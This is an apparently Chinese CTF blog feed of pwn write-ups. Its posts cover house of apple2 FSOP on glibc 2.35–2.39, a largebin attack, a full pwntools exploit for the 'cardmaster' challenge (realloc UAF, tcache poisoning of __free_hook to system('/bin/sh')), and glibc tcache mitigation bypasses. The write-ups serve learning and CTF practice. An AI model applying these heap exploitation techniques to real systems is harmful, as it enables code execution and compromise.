class="line">f._IO_write_end=<span class="number">0</span> <span class="comment">#0x30</span></span><br><span class="line">f._IO_write_ptr=<span class="number">1</span></span><br><span class="line">f._lock=io_list_all</span><br><span class="line">wide_vtable_addr=(heap_5+<span class="number">0xd8</span>+<span class="number">8</span>+<span class="number">8</span>)-<span class="number">0x68</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line">f+=p64(wide_vtable_addr)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">f+=p64(system_addr)</span><br><span class="line"><span class="comment">#flag=b&#x27;  sh\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```f.vtable=_IO_wfile_jumps``` ``` f._flags=b&#x27;  sh\x00\x00\x00\x00&#x27;```不必多说 </span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">f._wide_data=heap_5</span><br><span class="line">f._IO_read_base=0 # f+0x18</span><br><span class="line">f._IO_write_end=0 # f+0x30</span><br></pre></td></tr></table></figure><p>这里的修改不是因为这个字段本身要做什么修改，而是因为我们把 _wide_data也设置成了当前堆块，那么就需要满足</p><p><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code></p><p><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>  这两个条件，刚好  _IO_read_base和_IO_write_end没有限制，因此这样设置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">wide_vtable_addr=(heap_5+0xd8+8+8)-0x68</span><br><span class="line"></span><br><span class="line">f+=p64(wide_vtable_addr)</span><br><span class="line">system_addr=libc_base+libc.sym[&quot;system&quot;]</span><br><span class="line">f+=p64(system_addr)</span><br></pre></td></tr></table></figure><p>首先看后面三句，我们把f结构体后面又新增了两个内容，那么wide_vtable_addr的设置也就可以理解了，heap_5+0xd8+8+8正好是system的地址（heap+0xd8是vtable字段，再+8是wide_vtable_addr，再+8j就是system的字段)，那么-0x68就是因为<code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></p><p>那么上面的代码就可以实现 house of apple2。</p><h1 id="在glibc2-35-2-39之间的house-of-apple2的细小区别"><a href="#在glibc2-35-2-39之间的house-of-apple2的细小区别" class="headerlink" title="在glibc2.35-2.39之间的house of apple2的细小区别"></a>在glibc2.35-2.39之间的house of apple2的细小区别</h1><blockquote><p><a href="https://www.nssctf.cn/note/set/11632">https://www.nssctf.cn/note/set/11632</a></p></blockquote><p>这是我写的一篇题解。</p><p>glibc2.35(GLIBC 2.35-0ubuntu3.7)的libc汇编代码中，在_IO_flush_all_lockp是下面这个样子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 &amp;&amp; (v8-&gt;_flags &amp; <span class="number">0x8000</span>) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = __readfsqword(<span class="number">0x10u</span>);</span><br><span class="line">  lock = v8-&gt;_lock;</span><br><span class="line">  <span class="keyword">if</span> ( *(lock + <span class="number">1</span>) != v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _InterlockedCompareExchange(lock, <span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">      _lll_lock_wait_private(lock, v14, <span class="number">1LL</span>, v3, v4, v5);</span><br><span class="line">    lock = v8-&gt;_lock;</span><br><span class="line">    *(lock + <span class="number">1</span>) = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(lock + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在glibc2.35中，fcloseall调用这个函数的时候第一个参数正好是0，也就说a1&#x3D;&#x3D;0,那么这个分支就走不到了，后面lock&#x3D;v8-&gt;_lock *（lock+1) 也就用不到了，因此在glibc2.35版本中，_lock字段设置不设置都可以，反正都会绕过。</p><p>而在glibc2.39（Ubuntu GLIBC 2.39-0ubuntu8.1）中，_IO_flush_all变成了这个样子</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (v1-&gt;_flags &amp; <span class="number">0x8000</span>) == <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   v6 = v1-&gt;_lock;</span><br><span class="line">   v7 = __readfsqword(<span class="number">0x10u</span>);</span><br><span class="line">   v8 = v6[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">if</span> ( _libc_single_threaded &amp;&amp; !v8 )</span><br><span class="line">   &#123;</span><br><span class="line">     *v6 = <span class="number">1</span>;</span><br><span class="line">     v6[<span class="number">1</span>] = v7;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == v8 )</span><br><span class="line">   &#123;</span><br><span class="line">     ++*(v6 + <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看到，a1没有了，而且因为我们的设置v1-&gt;_flags &amp; 0x8000&#x3D;&#x3D;0 ，因此会使用v1-&gt;_lock,也因此这个字段我们必须要进行设置，经过分析（实际是因为stderr中这个字段是这样子的,并没有进行详细分析），只需要找到一个地址a，当*(a+8)&#x3D;&#x3D;0时即可，这样的地址非常好找，比如_IO_list_all这个地址即可。</p><h1 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h1><p>我在调试IO题时，发现没有办法以IO结构体形式打印信息，这样就不容易知道我写的是否有错，因此学习了一下如何加载符号表</p><blockquote><p><a href="https://www.cnblogs.com/9man/p/17741818.html">https://www.cnblogs.com/9man/p/17741818.html</a></p></blockquote><p>命令：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">loadfolder /ctf/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/.debug/.build-id</span><br></pre></td></tr></table></figure><p>可以在gdb.attach的地方写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(p,<span class="string">&#x27;b* $rebase(0x17f7)\nloadfolder /ctf/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/.debug/.build-id\nc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>之后</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p *(struct _IO_FILE*)_IO_list_all</span><br></pre></td></tr></table></figure><h1 id="关于largnbin-attack"><a href="#关于largnbin-attack" class="headerlink" title="关于largnbin attack"></a>关于largnbin attack</h1><p>largebin attack适用于向一个地址写入堆地址，比如改写 _IO_list_all这个全局变量</p><p>具体流程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io_list_all=libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">target=io_list_all-<span class="number">0x20</span></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x450</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x28</span>)  <span class="comment"># 分割堆块</span></span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x440</span>)</span><br><span class="line">create(<span class="number">6</span>,<span class="number">0x20</span>)  <span class="comment"># 分割堆块</span></span><br><span class="line">delete(<span class="number">3</span>)       <span class="comment"># 3号块进unsortedbin</span></span><br><span class="line">create(<span class="number">7</span>,<span class="number">0x460</span>) <span class="comment"># 3好块进largebin</span></span><br><span class="line">large_bin=libc_base+<span class="number">0x21b0e0</span></span><br><span class="line">edit(<span class="number">3</span>,pp64(large_bin,large_bin,heap_base+<span class="number">0x290</span>,target)) <span class="comment">#修改3号块的bk_nextsize指针为io_list_all-0x20</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># _IO_list_all -&gt; 5号块地址  #5号块进unsortedbin</span></span><br><span class="line">create(<span class="number">8</span>,<span class="number">0x460</span>)  <span class="comment">#5号块进largebin 因为5号块比3号块小，触发largebin attack 向io_list_all写入5号块地址</span></span><br></pre></td></tr></table></figure><p>要求就是第二个进入largebin 的堆块要比第一个小，但不能小太多，两个堆块要在同一个largebin里面</p><p>还要注意的是，4号块要分配0x28，因为经过largebin attack之后，5号块的prev_size字段就是  _flags字段， size字段就是 _IO_read_ptr字段，而  _flags非常重要，只编辑5号块是没办法修改这个字段的，因此要编辑4号块的最末尾从而编辑这个字段。</p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>自己的两篇题解</p><blockquote><p><a href="https://www.nssctf.cn/note/set/11632">https://www.nssctf.cn/note/set/11632</a></p><p><a href="https://www.nssctf.cn/note/set/11600">https://www.nssctf.cn/note/set/11600</a></p></blockquote><p>查看源码的网站：</p><blockquote><p><a href="https://elixir.bootlin.com/glibc/">https://elixir.bootlin.com/glibc/</a></p></blockquote><p>house of apple2作者博客</p><blockquote><p> <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/</a></p></blockquote><p>在学习 IO 攻击之前，先接触了 pwnking 提到的利用 <code>environ</code> 泄露栈地址并结合 ROP 的方法。当时觉得这种方式确实直观易懂，而且相对容易执行。然而，在深入学习 IO 攻击后，我发现它在很多情况下更加高效，甚至可以直接套公式来使用。实际做题时，<code>environ</code> 泄露 + ROP 的方法往往需要频繁进行任意地址堆块申请，操作较为繁琐，而 IO 攻击在某些场景下则显得更加简洁方便。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024网鼎杯半决赛cardmaster复现</title>
      <link href="/2025/03/01/2025-03-01-%E7%BD%91%E9%BC%8E%E6%9D%AFcardmaster%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/01/2025-03-01-%E7%BD%91%E9%BC%8E%E6%9D%AFcardmaster%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年打wdb的时候，libc2.27还没看过，所以导致没碰这道题，现在复现一下。</p><h1 id="恢复结构体"><a href="#恢复结构体" class="headerlink" title="恢复结构体"></a>恢复结构体</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">deck_cards</span>&#123;</span><br><span class="line"><span class="type">int</span> suit_count;</span><br><span class="line"><span class="type">int</span> digit_count;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> randomize level;</span><br><span class="line"><span class="type">char</span>* chara;</span><br><span class="line"><span class="built_in">void</span> (*func)();</span><br><span class="line">all_suit* all_suit_heap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">all_suit</span>&#123;</span><br><span class="line">suit* one_suit[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">card</span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> suit_point;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> digit_point;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">suit</span>&#123;</span><br><span class="line">card one_card[<span class="number">13</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是我自己恢复的结构体。恢复结构体这一步是帮助后续分析的重中之重。</p><p>这里提一下如何在ida里插入自定义结构体：在ida里shift+F1,然后按下“Insert”键，即可插入自定义的结构体。</p><p>之后在变量上按下Y键，更改变量类型即可。</p><h1 id="utf-8编码学习"><a href="#utf-8编码学习" class="headerlink" title="utf-8编码学习"></a>utf-8编码学习</h1><p>之前只知道utf-8是变长的，但是不知道具体是如何规定的，这个题目中的show_cards函数中就利用了这个规则，之前我不清楚导致分析这段代码较困难。</p><p>这里贴一下这段代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cur_strptr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; a1-&gt;suit_count )</span><br><span class="line">  &#123;</span><br><span class="line">    nember_of_1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">128</span>; (i &amp; a1-&gt;chara[cur_strptr]) != <span class="number">0</span>; i /= <span class="number">2</span> )</span><br><span class="line">      ++nember_of_1;</span><br><span class="line">    <span class="keyword">if</span> ( nember_of_1 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid suit table!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v8[v2] = cur_strptr;</span><br><span class="line">    v8[v2 + <span class="number">52</span>] = nember_of_1;</span><br><span class="line">    cur_strptr += nember_of_1;</span><br><span class="line">    v2 += nember_of_1 != <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这段代码宏观上理解就是，首先计算第一个字节的前缀1数目，然后把当前字节下标记录下来，把前缀1数目记录下来，然后下标+&#x3D;前缀1数目。</p><p>而utf-8的规则里面正好有这一条：</p><table><thead><tr><th>Unicode 码点范围</th><th>UTF-8 编码格式</th><th>前缀</th><th>说明</th></tr></thead><tbody><tr><td>U+0000 ~ U+007F</td><td>0xxxxxxx</td><td>0</td><td>单字节（兼容 ASCII）</td></tr><tr><td>U+0080 ~ U+07FF</td><td>110xxxxx 10xxxxxx</td><td>110 &#x2F; 10</td><td>双字节</td></tr><tr><td>U+0800 ~ U+FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td><td>1110 &#x2F; 10 &#x2F; 10</td><td>三字节</td></tr><tr><td>U+10000 ~ U+10FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td><td>11110 &#x2F; 10 &#x2F; 10 &#x2F; 10</td><td>四字节</td></tr></tbody></table><p>其中第一个字节的前缀1的数目表示了当前字符用几个字节来表示，之后n-1个字节全都是10开头。</p><h1 id="realloc学习"><a href="#realloc学习" class="headerlink" title="realloc学习"></a>realloc学习</h1><p>realloc(realloc_ptr, size)有两个参数，并且在特定参数有特定效果</p><p>size &#x3D;&#x3D; 0 ，这个时候等同于free。也就是free(realloc_ptr)，并且返回空指针。即没有uaf</p><p>realloc_ptr &#x3D;&#x3D; 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc,即malloc(size)</p><p>malloc_usable_size(realloc_ptr) &gt;&#x3D; size， 这个时候会把多余的内存释放掉,并返回原来的指针</p><p>malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</p><p>这里的realloc函数同样调用了__free_hook函数。具体来说,realloc直接调用了  _libc_free函数，而free函数是 _libc_free函数的别名，而free函数调用了  _free_hook函数，因此改写free_hook同样可以作用于realloc。</p><h1 id="分析漏洞点"><a href="#分析漏洞点" class="headerlink" title="分析漏洞点"></a>分析漏洞点</h1><p>这个程序的关键漏洞点在这里</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1-&gt;chara == &amp;suit_string )</span><br><span class="line">  tmp_str = <span class="built_in">malloc</span>(<span class="number">4</span> * a1-&gt;suit_count);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  tmp_str = <span class="built_in">realloc</span>(a1-&gt;chara, <span class="number">4</span> * a1-&gt;suit_count);</span><br></pre></td></tr></table></figure><p>realloc的第二个参数如何是0，就会导致realloc退化成free函数，然而tmp_str会被赋值为0，但是a1-&gt;chara这个函数并不会更改，这样也就造成了uaf漏洞，同样也有double free漏洞。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_info</span>(<span class="params">suit_count,digit_range,r_level,new_suite=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;suit count:&quot;</span>,<span class="built_in">str</span>(suit_count))</span><br><span class="line">    sla(<span class="string">&quot;digit range 1 - ?&quot;</span>,<span class="built_in">str</span>(digit_range))</span><br><span class="line">    sla(<span class="string">&quot;randomize level:&quot;</span>,<span class="built_in">str</span>(r_level))</span><br><span class="line">    <span class="keyword">if</span> suit_count==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    sla(<span class="string">&quot;new suite set:&quot;</span>,new_suite)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffle</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_cards</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xA9D)&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    set_info(<span class="number">0</span>,<span class="number">13</span>,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size,pad</span>):</span><br><span class="line">    init()</span><br><span class="line">    set_info(size//<span class="number">4</span>,<span class="number">13</span>,<span class="number">1000</span>,pad)</span><br><span class="line">p=process(<span class="string">&quot;./cardmaster&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">## 利用unsortedbin泄漏libc</span></span><br><span class="line">malloc(<span class="number">0x420</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">get_info()</span><br><span class="line">ru(<span class="string">&quot;suit chara set:&quot;</span>)</span><br><span class="line">libc_addr=uu64(p.recv(<span class="number">6</span>))+<span class="number">0x7fe6fb800000</span>-<span class="number">0x7fe6fbbebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc&quot;</span>,libc_addr)</span><br><span class="line"></span><br><span class="line">free_hook=libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># double free漏洞</span></span><br><span class="line">malloc(<span class="number">0x40</span>,p64(system))</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># tcache[1]: a</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment"># tcache[2]: a-&gt;a</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x40</span>,p64(free_hook))</span><br><span class="line"><span class="comment"># tcache[1]:a-&gt;__free_hook</span></span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#申请了链表头的a</span></span><br><span class="line"><span class="comment">#tcache[0]:__free_hook</span></span><br><span class="line">malloc(<span class="number">0x40</span>,p64(system)) <span class="comment">#申请了链表头的__free_hook，并且把__free_hook改写成system</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#写入/bin/sh\x00</span></span><br><span class="line"></span><br><span class="line">free()<span class="comment">#触发 system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>一开始由于对realloc函数不熟悉导致并没有发现漏洞点，反而被大量的堆块给迷惑了。</p><p>总结一下就是，在发现漏洞点之后，要先控制容易控制的，并且由于不是菜单题，对堆块的掌握比较差，因此要先转换成菜单题（malloc free show几个函数），从而降低分析难度。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.27-2.35 tcache堆利用</title>
      <link href="/2025/02/28/2025-02-28-glibc2.27-2.35%20tcache%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2025/02/28/2025-02-28-glibc2.27-2.35%20tcache%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文记录了glibc2.27-glibc2.35关于tcache堆利用的一些变化</p><p>参考文章:</p><blockquote><p><a href="https://www.freebuf.com/articles/system/234219.html">https://www.freebuf.com/articles/system/234219.html</a></p><p><a href="https://www.roderickchan.cn/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/">https://www.roderickchan.cn/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/</a></p></blockquote><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>在 <strong>glibc 2.27</strong> 版本中，引入了 <strong>tcache</strong> 机制，用于优化堆分配的性能。tcache 适用于 <strong>0x20 到 0x410</strong> 字节范围内的小块内存。释放堆块时，glibc 会优先检查对应大小的 tcache 是否已满，只有在 tcache 满载时，堆块才会被存入 <strong>fastbin</strong> 或 <strong>unsorted bin</strong> 等其他 bin 结构。每个 tcache bin 最多可存储 <strong>7</strong> 个堆块。</p><p>在 <strong>glibc 2.27</strong> 及更早的版本中，tcache 机制缺乏安全性检查，允许 <strong>任意 double free</strong>。攻击者可以修改 tcache 中堆块的 <strong>fd 指针</strong>，该指针指向的是前一个堆块的 <strong>user data 段</strong>，并且 glibc <strong>不会检查 size 字段</strong>，从而可以伪造指针，实现 <strong>任意地址分配</strong>。这一漏洞利用手法被称为 <strong>tcache poisoning</strong>（tcache 污染）。</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><p>在 <strong>glibc 2.31</strong> 版本中，<strong>tcache 结构体</strong> 新增了 <strong>key 字段</strong>，用于增强安全性。</p><p>当一个堆块被释放并进入 <strong>tcache</strong> 时，glibc 会首先检查该堆块的 <strong>key 字段</strong> 是否等于当前线程 <strong>tcache_perthread_struct</strong> 结构体的地址：</p><ul><li>如果 <strong>key 字段不同</strong>，则允许将该堆块存入 tcache，并将 <strong>key 字段更新为 tcache 地址</strong>。</li><li>如果 <strong>key 字段相同</strong>，glibc 则会遍历 tcache 链表，检查其中是否已存在该堆块，从而防止 <strong>double free</strong>。</li></ul><p>因此，若要绕过此检查并 <strong>对同一 tcache 级别的堆块进行 double free</strong>，可以在释放前 <strong>手动修改 key 字段为其他值</strong>，再执行 <code>free</code>，从而成功绕过重复释放检测。</p><h1 id="glibc2-35"><a href="#glibc2-35" class="headerlink" title="glibc2.35"></a>glibc2.35</h1><ul><li><code>tcachebin</code> 堆指针异或加密（<code>glibc-2.32</code> 引入）</li><li><code>tcahebin</code> 链的数量检查（<code>glibc-2.33</code> 引入）</li><li><code>fastbin</code> 堆指针异或加密（<code>glibc-2.32</code> 引入）</li><li>堆内存对齐检查（<code>glibc-2.32</code> 引入）</li><li>移除<code>__malloc_hook</code> 和<code>__free_hook</code>（<code>glibc-2.34</code> 引入）</li><li>引入 <code>tcache_key</code> 作为 <code>tcache</code> 的 <code>key</code> 检查（<code>glibc-2.34</code> 引入）</li></ul><h2 id="tcachebin-堆指针异或加密"><a href="#tcachebin-堆指针异或加密" class="headerlink" title="tcachebin 堆指针异或加密"></a><code>tcachebin</code> 堆指针异或加密</h2><p>在 <strong>glibc 2.31</strong> 及更高版本中，tcache 机制针对 <strong>fd 指针</strong> 引入了新的保护措施，使其不再是简单的前一个堆块地址，而是经过以下处理：</p><ol><li>取当前堆块的地址并 <strong>左移 12 位</strong>。</li><li>将该值与原本应存入的 <strong>fd 指针值（前一个堆块的地址）</strong> 进行 <strong>XOR 运算</strong>，得到新的 <strong>fd 值</strong>。</li></ol><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>当 <strong>tcache 仅存有一个堆块</strong> 时，可以通过其 <strong>fd 指针</strong> 提取用于加密的 <strong>XOR 密钥</strong>：</p><ul><li>读取 <strong>fd 指针值</strong>，然后左移 12 位，即可得到 <strong>堆地址</strong>。</li><li>该泄漏的堆地址可用于后续的 <strong>解密</strong> 和 <strong>伪造 fd 指针</strong>。</li></ul><p>在 <strong>伪造 fd 指针</strong> 时：</p><ul><li>计算目标 fd 指向的地址，即伪造的下一个堆块地址。</li><li>用此地址与 <strong>泄漏的 XOR 密钥</strong> 进行 XOR 计算，得到正确的加密 fd 值。</li><li>将计算出的 <strong>伪造 fd</strong> 写入目标堆块，确保其符合 tcache 机制的检查。</li></ul><p><strong>注意</strong>：后续申请的堆块地址应尽量接近泄漏的堆块地址，避免因地址差距过大导致 <strong>XOR 计算的密钥变化</strong>，影响利用成功率。</p><h2 id="tcache-链数量检查"><a href="#tcache-链数量检查" class="headerlink" title="tcache 链数量检查"></a>tcache 链数量检查</h2><p>从tcache中重新申请堆块时，会检查当前tcache的数量，如果数量为0，就不会再从tcache中申请。</p><p>在此之前，可以在tcache的第一个堆块的fd位置进行tcache poisoning，现在需要多申请至少一个，然后在第二个上改。</p><h2 id="堆内存对齐检查"><a href="#堆内存对齐检查" class="headerlink" title="堆内存对齐检查"></a>堆内存对齐检查</h2><p>通过错位来申请堆块变成历史，申请的堆块必须对其0x10。</p><h2 id="引入-tcache-key-作为-tcache-的-key-检查"><a href="#引入-tcache-key-作为-tcache-的-key-检查" class="headerlink" title="引入 tcache_key 作为 tcache 的 key 检查"></a>引入 <code>tcache_key</code> 作为 <code>tcache</code> 的 <code>key</code> 检查</h2><p>tcache_key是一个随机的值，每次放入tcache的堆块的key字段都是随机值，无法通过泄漏tcache的key字段来泄漏堆地址。</p><h2 id="移除-malloc-hook-和-free-hook"><a href="#移除-malloc-hook-和-free-hook" class="headerlink" title="移除__malloc_hook 和__free_hook"></a>移除<code>__malloc_hook</code> 和<code>__free_hook</code></h2><p>在2.34以前，可以通过向这两个钩子函数写入system地址或者one_gadget地址来实现getshell，现在成为了历史。</p><p>一般来说glibc2.35以后的getshell，可以通过篡改IO_FILE结构体来实现，也可以通过下面这种办法：</p><p><strong>在Linux C中，environ是一个全局变量，它储存着系统的环境变量。</strong></p><p>它储存在libc中</p><p>因此environ是沟通libc地址与栈地址的桥梁。</p><p>通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。</p><p>可以通过计算得到edit函数的返回地址，然后向该地址写入rop链从而实现getshell。</p><p>以下是我写的一篇题解</p><blockquote><p><a href="https://www.nssctf.cn/note/set/11600">https://www.nssctf.cn/note/set/11600</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asis_2016_b00ks</title>
      <link href="/2024/11/15/2024-11-15-asis_2016_b00ks/"/>
      <url>/2024/11/15/2024-11-15-asis_2016_b00ks/</url>
      
